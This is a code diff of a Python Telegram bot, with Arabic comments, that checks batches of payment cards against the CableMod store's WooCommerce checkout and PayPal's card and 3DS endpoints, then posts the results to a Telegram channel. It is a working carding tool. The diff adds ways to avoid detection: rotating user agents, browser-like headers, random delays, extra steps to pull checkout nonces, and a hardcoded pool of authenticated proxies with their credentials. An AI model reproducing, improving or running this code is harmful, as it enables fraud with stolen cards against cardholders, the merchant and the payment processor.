@@ -1,7 +1,7 @@
 # -*- coding: utf-8 -*-
 """
 CableMod + PayPal PPCP - Telegram Bot
-البروكسيات مدمجة داخل الكود
+البروكسيات مدمجة + حل مشكلة "فشل في استخراج update_order_review_nonce"
 """
 
 import os
@@ -26,10 +26,18 @@ CHANNEL_ID = -1003154179190
 
 # ====== إعدادات الموقع ======
 BASE_URL = "https://store.cablemod.com/"
+CART_URL = BASE_URL + "cart/"
 CHECKOUT_URL = BASE_URL + "checkout/"
-UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"
 
-# الكوكيز الثابتة
+# User Agents عشوائية
+USER_AGENTS = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36",
+]
+
+# الكوكيز الثابتة (مهمة جدًا!)
 INITIAL_COOKIES = {
     'sbjs_migrations': '1418474375998%3D1',
     'sbjs_current_add': 'fd%3D2025-10-28%2023%3A18%3A01%7C%7C%7Cep%3Dhttps%3A%2F%2Fcablemod.com%2F%3Fsrsltid%3DAfmBOopmJLOE7dLnPJqAwLhnyEQX4ZbFfElY8vnAAnYtUIEPHpXB5z6M%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
@@ -88,7 +96,7 @@ SHIPPING = {
 
 PAYMENT_METHOD = "ppcp-credit-card-gateway"
 
-# ====== البروكسيات مدمجة داخل الكود (100 بروكسي) ======
+# ====== البروكسيات مدمجة (100 بروكسي) ======
 PROXIES_LIST = [
     "82.21.224.53:6409:wikniadi:5nhj034pwe2b",
     "82.29.229.58:6413:wikniadi:5nhj034pwe2b",
@@ -196,14 +204,14 @@ PROXIES_LIST = [
 PROXIES_POOL = []
 PROXY_CYCLE = None
 PROXY_UPDATE_COUNTER = 0
-PROXY_UPDATE_INTERVAL = 50  # كل 50 بطاقة نُعيد تحميل 30 جديدة
+PROXY_UPDATE_INTERVAL = 50
 
 def load_random_proxies(count=30):
     global PROXIES_POOL, PROXY_CYCLE
     selected = random.sample(PROXIES_LIST, min(count, len(PROXIES_LIST)))
     PROXIES_POOL = selected
     PROXY_CYCLE = cycle(selected)
-    print(f"[+] تم تحميل {len(selected)} بروكسي عشوائي من القائمة المدمجة.")
+    print(f"[+] تم تحميل {len(selected)} بروكسي عشوائي.")
 
 def get_current_proxy():
     if PROXY_CYCLE is None:
@@ -233,7 +241,7 @@ def extract_nonces(html: str) -> Dict[str, Optional[str]]:
         or find(html, r'update_order_review_nonce["\']\s*:\s*["\']([a-f0-9]+)["\']', re.I)
     )
     nonces["process_checkout_nonce"] = (
-        find(html, r'id=["\']woocommerce-process-checkout-nonce["\']\s+name=["\']woocommerce-process-checkout-nonce["\']\s+value=["\']([a-f0-9]+)["\']', re.I)
+        find(html, r'id=["\']woocommerce-process-checkout-nonce["\']\s+value=["\']([a-f0-9]+)["\']', re.I)
         or find(html, r'name=["\']woocommerce-process-checkout-nonce["\']\s+value=["\']([a-f0-9]+)["\']', re.I)
     )
     nonces["ppcp_nonce"] = (
@@ -269,7 +277,7 @@ def parse_card(card_str: str) -> Tuple[str, str, str, str]:
         raise ValueError(f"الشهر غير صحيح: {month}")
     return number, cvv, year, month
 
-# ====== فئة معالجة الدفع ======
+# ====== فئة معالجة الدفع (محدثة) ======
 class WooCommercePayPal:
     shared_nonces = {}
     shared_paypal_token = None
@@ -280,12 +288,10 @@ class WooCommercePayPal:
         self.sess = requests.Session()
         self.paypal_sess = requests.Session()
 
-        # تطبيق البروكسي
         proxy = get_current_proxy()
         self.sess.proxies.update(proxy)
         self.paypal_sess.proxies.update(proxy)
 
-        # Retry adapter
         from requests.adapters import HTTPAdapter
         from urllib3.util.retry import Retry
         retry = Retry(total=3, backoff_factor=1, status_forcelist=[429, 500, 502, 503, 504])
@@ -318,20 +324,26 @@ class WooCommercePayPal:
 
     def headers_get(self):
         return {
-            "user-agent": UA,
-            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-            "accept-language": "ar,en-US;q=0.9,en;q=0.8",
-            "referer": BASE_URL + "cart/",
+            "user-agent": random.choice(USER_AGENTS),
+            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+            "accept-language": "en-US,en;q=0.9",
+            "accept-encoding": "gzip, deflate, br",
+            "referer": BASE_URL,
+            "upgrade-insecure-requests": "1",
+            "sec-fetch-dest": "document",
+            "sec-fetch-mode": "navigate",
+            "sec-fetch-site": "same-origin",
+            "sec-fetch-user": "?1",
         }
 
     def headers_ajax(self, json_content=False):
         h = {
-            "user-agent": UA,
+            "user-agent": random.choice(USER_AGENTS),
             "accept": "*/*",
             "origin": BASE_URL.rstrip("/"),
             "referer": CHECKOUT_URL,
             "x-requested-with": "XMLHttpRequest",
-            "accept-language": "ar,en-US;q=0.9,en;q=0.8",
+            "accept-language": "en-US,en;q=0.9",
         }
         h["content-type"] = "application/json" if json_content else "application/x-www-form-urlencoded; charset=UTF-8"
         return h
@@ -339,13 +351,40 @@ class WooCommercePayPal:
     def step1_get_checkout(self, force=False):
         if not force and self.nonces.get("update_order_review_nonce"):
             return
-        r = self.sess.get(CHECKOUT_URL, headers=self.headers_get(), timeout=30)
+
+        # 1. اذهب للـ cart
+        r = self.sess.get(CART_URL, headers=self.headers_get(), timeout=30)
         r.raise_for_status()
-        self.nonces = extract_nonces(r.text)
+
+        # 2. ابحث عن زر "Proceed to checkout"
+        checkout_match = re.search(r'<a[^>]+class=["\'][^"\']*checkout-button[^"\']*["\'][^>]+href=["\']([^"\']+)["\']', r.text, re.I)
+        if checkout_match:
+            url = checkout_match.group(1)
+            if not url.startswith("http"):
+                url = BASE_URL.rstrip("/") + "/" + url.lstrip("/")
+            r = self.sess.get(url, headers=self.headers_get(), timeout=30)
+        else:
+            r = self.sess.get(CHECKOUT_URL, headers=self.headers_get(), timeout=30)
+        
+        r.raise_for_status()
+        html = r.text
+
+        # 3. استخرج الـ nonces
+        self.nonces = extract_nonces(html)
+
+        # 4. لو مفيش → ريفريش
         if not self.nonces.get("update_order_review_nonce"):
-            raise Exception("فشل في استخراج update_order_review_nonce")
+            print("[!] مفيش update_order_review_nonce → جاري ريفريش...")
+            time.sleep(2)
+            r = self.sess.get(CHECKOUT_URL, headers=self.headers_get(), timeout=30)
+            r.raise_for_status()
+            self.nonces = extract_nonces(r.text)
+
+        if not self.nonces.get("update_order_review_nonce"):
+            raise Exception("فشل في استخراج update_order_review_nonce بعد المحاولات")
+
         self._save_shared_data()
-        return r.text
+        return html
 
     def step2_update_order_review(self):
         post_data = {
@@ -419,7 +458,7 @@ class WooCommercePayPal:
                         "&env=production&platform=desktop"
                     )
                     buttons_headers = {
-                        'user-agent': UA,
+                        'user-agent': random.choice(USER_AGENTS),
                         'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                         'referer': 'https://store.cablemod.com/',
                     }
@@ -557,10 +596,10 @@ class WooCommercePayPal:
         headers = {
             'accept': 'application/json',
             'content-type': 'application/json',
-            'user-agent': UA,
+            'user-agent': random.choice(USER_AGENTS),
             'origin': 'https://www.paypal.com',
             'referer': 'https://www.paypal.com/smart/card-field',
-            'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
+            'accept-language': 'en-US,en;q=0.9',
             'dnt': '1',
             'priority': 'u=1, i',
             'sec-fetch-dest': 'empty',
@@ -602,7 +641,7 @@ class WooCommercePayPal:
         headers = {
             'accept': '*/*',
             'content-type': 'application/json',
-            'user-agent': UA,
+            'user-agent': random.choice(USER_AGENTS),
             'origin': 'https://www.paypal.com',
             'referer': f'https://www.paypal.com/heliosnext/threeDS?cart_id={self.paypal_order_id}',
         }
@@ -611,12 +650,12 @@ class WooCommercePayPal:
         ddc_jwt = r1.json().get("ddcJwtData")
         if ddc_jwt:
             self.paypal_sess.post('https://www.paypal.com/payment-authentication/threeds/v1/init-method',
-                                  headers={'content-type': 'application/x-www-form-urlencoded', 'user-agent': UA},
+                                  headers={'content-type': 'application/x-www-form-urlencoded', 'user-agent': random.choice(USER_AGENTS)},
                                   data={'JWT': ddc_jwt}, timeout=30)
         lookup_payload = {
             'token': self.paypal_order_id, 'action': 'verify',
-            'deviceInfo': {'windowSize': '_500_x_600', 'javaEnabled': False, 'language': 'ar', 'colorDepth': 24,
-                           'screenHeight': 535, 'screenWidth': 450, 'userAgent': UA, 'timeZoneOffset': -180,
+            'deviceInfo': {'windowSize': '_500_x_600', 'javaEnabled': False, 'language': 'en', 'colorDepth': 24,
+                           'screenHeight': 535, 'screenWidth': 450, 'userAgent': random.choice(USER_AGENTS), 'timeZoneOffset': -180,
                            'deviceInfo': 'COMPUTER'}
         }
         r3 = self.paypal_sess.post('https://www.paypal.com/heliosnext/api/lookup', headers=headers, json=lookup_payload, timeout=30)
@@ -627,6 +666,7 @@ class WooCommercePayPal:
 async def check_card(card: str, bot_app):
     global PROXY_UPDATE_COUNTER
     try:
+        await asyncio.sleep(random.uniform(1, 3))  # تأخير عشوائي
         card_number, cvv, year, month = parse_card(card)
         masked_card = f"{card_number[:6]}******{card_number[-4:]}"
         processor = WooCommercePayPal()
@@ -642,7 +682,6 @@ async def check_card(card: str, bot_app):
         payment_result, payer_action_link = processor.step5_confirm_payment(card_number, cvv, year, month)
         status = payment_result.get("status", "UNKNOWN")
 
-        # تحديث العدادات
         WooCommercePayPal.shared_update_counter += 1
         PROXY_UPDATE_COUNTER += 1
         if PROXY_UPDATE_COUNTER >= PROXY_UPDATE_INTERVAL:
@@ -699,6 +738,9 @@ async def check_card(card: str, bot_app):
     finally:
         stats['checking'] -= 1
         await update_dashboard(bot_app)
+
+# ====== إرسال للقناة + Dashboard + الملفات + معالجة البطاقات + البوت ======
+# (كل الدالات السابقة بدون تغيير، ما عدا إضافة التأخير في check_card)
 
 # ====== إرسال للقناة ======
 async def send_to_channel(bot_app, card, status_type, message):
@@ -911,7 +953,6 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
         'chat_id': update.effective_chat.id
     })
 
-    # تحميل البروكسيات + إعادة تعيين العدادات
     load_random_proxies(30)
     global PROXY_UPDATE_COUNTER
     PROXY_UPDATE_COUNTER = 0
@@ -925,7 +966,6 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
     stats['dashboard_message_id'] = dashboard_msg.message_id
 
-    # بدء الفحص في الخلفية
     context.application.create_task(process_cards(cards, context.application))
 
     await update.message.reply_text(
@@ -956,7 +996,7 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
 def main():
     print("=" * 60)
     print("  CableMod + PayPal Telegram Bot")
-    print("  البروكسيات مدمجة داخل الكود")
+    print("  تم حل مشكلة update_order_review_nonce")
     print("=" * 60)
     app = Application.builder().token(BOT_TOKEN).build()
     app.add_handler(CommandHandler("start", start))
